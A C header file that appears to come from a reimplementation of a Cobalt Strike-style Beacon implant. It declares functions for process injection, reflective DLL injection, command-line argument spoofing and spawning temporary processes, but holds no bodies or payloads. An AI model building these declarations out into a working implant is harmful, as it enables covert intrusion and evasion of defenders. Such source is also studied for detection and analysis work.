#pragma once
#include "Global.h"
#include "Utils.h"
#include "comm.h"
#include "common.h"

int __cdecl sub_10003687(BeaconStartProcess* pBeaconStartProcess);

void ProcessInject(int pid, PROCESS_INFORMATION* pi, HANDLE hProcess, char* payload, size_t p_len, int p_offset, char* arg, int a_len);

int BeaconExecuteCommand(char* path, int path_size, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo, int Flag, int ignoreToken);

void BeaconSpawnX86(BOOL ignoreToken, char* data, size_t Size, BOOL x86);

void BeaconReflectiveDLLInject(char* Taskdata, int Taskdata_size, int x86);

int BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo);

int BeaconCreateProcess(char* path, int path_size, _STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo, int dwCreationFlags, int ignoreToken, int PPID);

void BeaconRunCommand(char* Taskdata, int Taskdata_size);

void BeaconSpoofArgsAdd(char* Taskdata, int Taskdata_size);

void SpoofArgsRemove(char* Taskdata, int Taskdata_size);

void SpoofArgsList();

void getspawntopath(char* path_buffer, BOOL x86);

